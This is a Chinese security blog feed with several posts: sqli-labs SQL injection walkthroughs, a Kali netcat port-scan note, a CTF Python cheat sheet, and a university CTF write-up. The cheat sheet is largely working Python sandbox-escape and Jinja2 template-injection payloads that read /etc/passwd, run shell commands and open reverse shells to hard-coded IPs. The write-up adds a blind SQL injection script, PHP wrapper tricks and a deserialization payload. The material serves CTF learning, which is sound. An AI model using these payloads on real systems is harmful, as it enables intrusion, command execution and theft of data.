列所有数据库:<code>http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),concat(%27;%27,schema_name)%20from%20information_schema.schemata--+</code></p><p>列数据库当前表:<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_name= &#39;security&#39;--+</code></p><p>为了方便练习，自己加了个flag数据库还有fl4g的表，以后爆出fl4g数据即可</p><p>爆flag数据库的表：<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;--+</code></p><p>爆fl4g这个表的列：<code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p><h2 id="Less-2-基于错误的GET整型注入"><a href="#Less-2-基于错误的GET整型注入" class="headerlink" title="Less 2 (基于错误的GET整型注入)"></a>Less 2 (基于错误的GET整型注入)</h2><p>第二关还是手动输入单引号测试，发现报错，单引号影响了闭合，所以这个可能不是字符型注入。</p><p><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,3--+</code>测试发现在2，3有回显，所以和第一关一样依次查询就好。</p><p>爆当前数据库和版本：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,database(),version()--+</code></p><p>查询所有数据库：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p>查flag数据库的表：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;</code></p><p>查fl4g表的字段<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p><h2 id="Less-3-基于错误的GET单引号变形字符型注入"><a href="#Less-3-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less 3(基于错误的GET单引号变形字符型注入)"></a>Less 3(基于错误的GET单引号变形字符型注入)</h2><p>输入单引号测试发现报错是：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p><p>发现多了个括号，于是把括号闭合一下就可以了，后台应该是把输入的id写成<code>(&#39;$id&#39;)</code>这样了</p><p>测试发现<code>http://localhost/sqli-labs-master/Less-3/?id=-1%27%20)%20union%20select%201,2,3--+</code>在2，3位有回显所以和前两关差不多依次爆数据库，爆表，爆列，字段</p><p>列所有数据库：<code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39; ) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p>这里不一一赘述了，直接给出后面payload</p><p><code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39; ) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p><h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less 4(基于错误的GET双引号字符型注入)"></a>Less 4(基于错误的GET双引号字符型注入)</h2><p>通过单引号测试发现没有异常，于是双引号测试一下，发现报错</p><p><img src="/2019/02/26/sqli-labs/less4-1.jpg" alt=" "></p><p>sql后台可能是(“$id”)这样写的，于是把双引号和反括号都闭合一下就好。</p><p>还是在2，3位置有回显，于是继续用联合查询，列出所有数据库。</p><p>payload：<code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p>在后台查询的语句其实是：<code>SELECT * FROM users WHERE id=(&quot;-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata-- &quot;) LIMIT 0,1</code>可以看到双引号和括号都闭合了。</p><p>继续爆表，依次进行。。。</p><p><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot; ) union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&#39;fl4g&#39;--+</code></p><h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less 5(双注入GET单引号字符型注入)"></a>Less 5(双注入GET单引号字符型注入)</h2><p>这一关是双注入，不过貌似也有人当盲注做出来了or2</p><p>双注入解释起来有点复杂，所以看一下这个<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">文章</a></p>]]></content>
    
    <summary type="html">
    
      sqli-labs学习
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux 渗透学习记录</title>
    <link href="http://bobosec.top/2019/01/18/kali-linux-study/"/>
    <id>http://bobosec.top/2019/01/18/kali-linux-study/</id>
    <published>2019-01-18T13:03:25.000Z</published>
    <updated>2019-01-19T04:34:16.061Z</updated>
    
    <content type="html"><![CDATA[<p>这个假期准备学一下linux的渗透，一步一步慢慢来吧~</p><h2 id="一些小工具"><a href="#一些小工具" class="headerlink" title="一些小工具"></a>一些小工具</h2><p>在kali里面自带了无数小工具用来渗透，在这里列举一下</p><ol><li>namp （用于扫描）但是namp扫描有很大噪音，会被记录，小心利用。</li><li>wafw00f （这个是用来识别web防火墙）</li></ol><h2 id="使用netcat编写自己的端口扫描器"><a href="#使用netcat编写自己的端口扫描器" class="headerlink" title="使用netcat编写自己的端口扫描器"></a>使用netcat编写自己的端口扫描器</h2><p>命令：<code>while read r; do nc -v -z $r 1-65535; done &lt;iplist</code></p><p>这里需要自己准备一下iplist这个文件。这个是查看和扫描目标开放端口的。</p><p>相同的脚本还可以修改为在单个IP上攻击多个目标。</p><p>代码：<code>while read  r; do nc -v -z target $r; done &lt; ports</code></p><p>在使用自定义端口扫描器的时候，会容易被警报。。。</p>]]></content>
    
    <summary type="html">
    
      立个flag，2019寒假学习完linux kali的渗透
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日积月累" scheme="http://bobosec.top/tags/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>ctf-python一些技巧</title>
    <link href="http://bobosec.top/2018/12/23/ctf-python/"/>
    <id>http://bobosec.top/2018/12/23/ctf-python/</id>
    <published>2018-12-23T07:18:43.000Z</published>
    <updated>2018-12-23T12:55:08.228Z</updated>
    
    <content type="html"><![CDATA[<p>现在比赛Python的站点越来越多，发一些绕过python限制的东西作为以后备用嘿嘿嘿</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>Python2.7和3.5默认使用的序列化格式有所区别，一般带有括号和换行的序列化数据是2.7使用的，而包含\x00的一般是3.5使用的。windows 和 linux 反序列化的数据是不同的</p><h1 id="沙盒绕过"><a href="#沙盒绕过" class="headerlink" title="沙盒绕过"></a>沙盒绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># read 函数，读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;abc.php&apos;).read()</span><br><span class="line"># write 函数，写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)</span><br><span class="line"># 执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&apos; )</span><br><span class="line"># 通过 system 执行任意命令</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;id&apos;)</span><br><span class="line"># 通过 popen 执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;os&apos;].__dict__[&apos;popen&apos;](&apos;id&apos;).read()</span><br><span class="line"># 打包文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;os&apos;].__dict__[&apos;popen&apos;](&apos;tar -czvf /tmp/www.tar.gz /home/ctf/www&apos;).read()</span><br><span class="line"># base64 编码读取文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;os&apos;].__dict__[&apos;popen&apos;](&apos;base64 /tmp/www.tar.gz&apos;).read()</span><br></pre></td></tr></table></figure><h1 id="Flask-Jinja2模板注入"><a href="#Flask-Jinja2模板注入" class="headerlink" title="Flask/Jinja2模板注入"></a>Flask/Jinja2模板注入</h1><h2 id="首先验证一下漏洞看有没有回显"><a href="#首先验证一下漏洞看有没有回显" class="headerlink" title="首先验证一下漏洞看有没有回显"></a>首先验证一下漏洞看有没有回显</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10/&#123;&#123;1+2&#125;&#125;</span><br><span class="line">http://192.168.1.10/?name=&#123;&#123;1+2&#125;&#125;</span><br><span class="line">http://192.168.1.10/?name=&#123;&#123;1^0&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后可以获取配置信息试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Flask模版中的一个全局对象，包含了应用程序的配置值</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"># 与服务器环境相关的对象字典</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="利用方法（python2-7）"><a href="#利用方法（python2-7）" class="headerlink" title="利用方法（python2.7）"></a>利用方法（python2.7）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 读文件</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;1.txt&apos;).read()</span><br><span class="line"># 写文件</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;2.txt&apos;,&apos;w&apos;).write(&apos;Write it!&apos;)</span><br><span class="line"># 读文件，base64编码</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;1.txt&apos;).read().encode(&apos;base64&apos;)</span><br><span class="line"># 通过 subprocess.Popen 执行 shell 命令</span><br><span class="line">&apos;&apos;[&apos;__class__&apos;][&apos;__mro__&apos;].__getitem__(2)[&apos;__subclasses__&apos;]()[230]([&apos;ls&apos;, &apos;-al&apos;, &apos;/home&apos;],stdout=-1)[&apos;communicate&apos;]()</span><br><span class="line"># 通过 os.popen 执行 shell 命令</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line"># eval python code __import__(&quot;sys&quot;).version</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__()</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &apos;os.system(&quot;ls&quot;)&apos;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&apos;)</span><br></pre></td></tr></table></figure><h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 读写文件</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line"># 得到eval函数</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;]</span><br><span class="line"># 读写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;open(&apos;/etc/passwd&apos;).read()&quot;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()</span><br><span class="line"># 执行命令</span><br><span class="line"># 得到system，system执行命令不会有回显</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;cat /etc/passwd&apos;).read()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;subprocess&apos;).Popen([&apos;cat&apos;, &apos;/etc/passwd&apos;]).read()</span><br><span class="line"># 反弹shell</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.85.146/4545 0&gt;&amp;1&quot;&apos;)</span><br></pre></td></tr></table></figure><h1 id="有的需要绕过过滤"><a href="#有的需要绕过过滤" class="headerlink" title="有的需要绕过过滤"></a>有的需要绕过过滤</h1><p><code>{(&#39;&#39;|attr(&#39;__class__&#39;)}}，{(&#39;&#39;[&#39;__class__&#39;])}}</code>和<code></code>一样的<br>空格可以用tab(%09)绕过<br>| 后不允许接a-z可以用%0c，tab等绕过<br>os可以通过python中exec绕过<br>如果过滤仅限于 request.args 但是不允许 post，简单的办法是可以用request.cookies来绕过<br>flask和django的模板注入还有一种内置方法<code>request.__class__</code>效果等于<code>request|attr(&#39;__class__&#39;)</code><br>通过参数引入字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?secret=&#123;&#123;request.args.class.join((request.args.usc*2,request.args.usc*2))&#125;&#125;&amp;usc=_&amp;class=class</span><br></pre></td></tr></table></figure></p><p>通过设定变量提前创建好变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?secret=&#123;%set%09class=request.args.class.join((request.args.usc*2,request.args.usc*2))%&#125;&#123;&#123;class&#125;&#125;&amp;usc=_&amp;class=class</span><br></pre></td></tr></table></figure></p><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>利用字符串 format 的漏洞，如果格式化字符串的内容可以被控制，就能输出一些敏感信息，但是无法执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class User(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"># a == joe</span><br><span class="line">input_t = &apos;&#123;0.name&#125;&apos;</span><br><span class="line">a = input_t.format(User(&apos;joe&apos;))</span><br><span class="line"></span><br><span class="line"># a == joe</span><br><span class="line">input_t = &apos;&#123;user.name&#125;&apos;</span><br><span class="line">a = input_t.format(user=User(&apos;joe&apos;))</span><br></pre></td></tr></table></figure></p><p>本文参考：<a href="https://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/" target="_blank" rel="noopener">https://www.restran.net/2018/10/29/ctf-python-vulnerability-notes/</a></p>]]></content>
    
    <summary type="html">
    
      python各类技巧
    
    </summary>
    
      <category term="CTF积累" scheme="http://bobosec.top/categories/CTF%E7%A7%AF%E7%B4%AF/"/>
    
    
      <category term="日积月累" scheme="http://bobosec.top/tags/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>2018中原工学院校赛题解</title>
    <link href="http://bobosec.top/2018/12/23/zhongyuan/"/>
    <id>http://bobosec.top/2018/12/23/zhongyuan/</id>
    <published>2018-12-23T04:16:20.000Z</published>
    <updated>2018-12-23T13:05:07.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><a href="http://39.108.109.85:9000" target="_blank" rel="noopener">http://39.108.109.85:9000</a><br>先开始有点懵逼，查看源代码无果（讲道理这个前端写的挺好看），然后看了一下响应头，发现了tips<br><img src="/2018/12/23/zhongyuan/1.jpg" alt=" "><br>访问发现一段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &quot;***&quot;;</span><br><span class="line">if (isset($_GET[&apos;repo&apos;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&apos;repo&apos;], $flag) == 0) </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &apos;No&apos;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>这个代码大概就是说需要用repo和flag比较两个字符串是否一样，strcmp()这个函数就是比较两个字符串是否一样，一样返回0。实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本php的网站进行渗透测试。<br>于是我们知道了，repo是一个数组或者一个object即可payload如下：<br><code>http://39.108.109.85:9000/?repo[]=0</code><br><code>Flag: drops{589c76a724af0a8303862a900f74d5e4}</code></p><h2 id="上官婉儿"><a href="#上官婉儿" class="headerlink" title="上官婉儿"></a>上官婉儿</h2><p>39.108.109.85:9001<br>打开发现是个注入，测试一下过滤，发现单引号可以，但是不能and，union等等…<br>直接贴脚本爆库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    for j in &quot;qazxswedcvfrtgbnhyujmkiolp1234567890@,!+_&quot;:</span><br><span class="line">        url = f&quot;http://39.108.109.85:9001/?id=if(mid((&#123;payload&#125;),&#123;i&#125;,1) regexp &apos;&#123;j&#125;&apos;,1,2)&quot;</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        if &quot;Your id is 1&quot; in r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p><p>最后出来的库名<br><img src="/2018/12/23/zhongyuan/sql1.jpg" alt=" "><br>md5加密一下加上drops{}就好<br><code>drops{184b3f811e4e3f2eb9d763cd33dffdf6}</code></p><h2 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h2><p><a href="http://96.45.177.217:7070/" target="_blank" rel="noopener">http://96.45.177.217:7070/</a><br>这个打开看到<code>You need get a &#39;t&#39;</code>然后get一个t上去可以看到源码<br><a href="http://96.45.177.217:7070/?t" target="_blank" rel="noopener">http://96.45.177.217:7070/?t</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;t&apos;]))&#123;</span><br><span class="line">    $_COOKIE[&apos;bash_token&apos;] = $_GET[&apos;t&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;You need get a &apos;t&apos;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&apos;sleep&apos;]))&#123;</span><br><span class="line">    if(!is_numeric($_POST[&apos;sleep&apos;]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        echo &apos;Gime me a number plz.&apos;;</span><br><span class="line">    &#125;else if($_POST[&apos;sleep&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;   </span><br><span class="line">        echo &apos;NoNoNo sleep too short.&apos;;</span><br><span class="line">    &#125;else if($_POST[&apos;sleep&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">        echo &apos;NoNoNo sleep too long.&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        sleep((int)$_POST[&apos;sleep&apos;]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这个代码意思是要给sleep一个值，必须按照那个规定，然后sleep那么多秒才给你flag，但是这里有is_numeric()和int()<br>前者支持普通数字型、科学记数法型、部分支持十六进制0x型，在is_numeric()支持的形式中，int()不能正确转换十六进制型、科学计数法型。<br>因此可以构造6e6、0x4F1A01。<br>最后一直没有flag。。。浏览器的锅，换成bp一下就好了<br><img src="/2018/12/23/zhongyuan/快一点.jpg" alt=" "><br><code>drops{2018_ctf_zhongyuangong_xiaosai}</code></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://96.45.177.217:8080/" target="_blank" rel="noopener">http://96.45.177.217:8080/</a><br>这个题目是一个简单的文件上传，但是肯定不允许php后缀，我们可以绕过一下，我尝试了phtml，php4等等发现都可以传成功，但是没有路径，没法用菜刀<br>很迷一直。。。知道私聊了一下工作人员，他说这个题只要姿势对了就是没有路径显示，直接出flag，所以又厚脸皮要了hint<br>直接改文件后缀为<code>pht</code>就行，flag直接出来了<br><img src="/2018/12/23/zhongyuan/pht.jpg" alt=" "><br><code>drops{d0df0djkljsdf122120dsfdsfsf}</code></p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p><a href="http://39.106.148.174:8666/" target="_blank" rel="noopener">http://39.106.148.174:8666/</a><br>查看源代码看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个大概意思就是必须要user=admin，还要有你要读取的文件，还有要你的密码<br>这个题目考察的是php封装协议，这个题目首先要突破的是：<br>if(isset($user)&amp;&amp;(file_get_contents($user,’r’)===”admin”))<br>如何让file_get_contents($user,’r’)===”admin”呢？<br>答案是用php的封装协议php://input，因为php：//input可以得到原始的post数据： 首先我们用php伪协议构造admin<br><img src="/2018/12/23/zhongyuan/4.jpg" alt=" "><br>看到已经成功成为了admin，绕过第一层，然后我们看到有个class.php，我们用php的另一个封装协议：<code>php://filter</code><br>利用这个协议就可以读取任意文件了<br>利用方法：<code>php://filter/convert.base64-encode/resource=class.php</code><br>这里把读取到的class.php的内容转换为base64的格式<br>下图是我解码完的<br><img src="/2018/12/23/zhongyuan/3.jpg" alt=" "><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">class Read&#123;//flag.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function _toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;_toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>此时想构造pass参数获得Read类中的file变量并且观察到有魔术方法想到php反序列化漏洞<br>这里贴一张构造的图<br><img src="/2018/12/23/zhongyuan/反序列化.jpg" alt=" "><br>最后payload：<code>/?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:10:%22./flag.php%22;}</code><br><img src="/2018/12/23/zhongyuan/反2.jpg" alt=" "><br><code>drops{asfhdi_fj12sh}</code></p><h1 id="CPYTO"><a href="#CPYTO" class="headerlink" title="CPYTO"></a>CPYTO</h1><p>你了解我么<br><a href="http://39.108.109.85/pic.jpg" target="_blank" rel="noopener">http://39.108.109.85/pic.jpg</a><br>先开始这个题一直是个盲文表。。。一脸懵逼，后来出题人改了一下题目，打开是一个海伦凯勒<br>然后对照盲文表<br><img src="/2018/12/23/zhongyuan/111.jpg" alt=" "><br>解出来<code>kmdonowg</code>，题目说了md5加密一下即可得到<br><code>drops{8aa5b596bf284a6dd446f9e141b47861}</code></p><h1 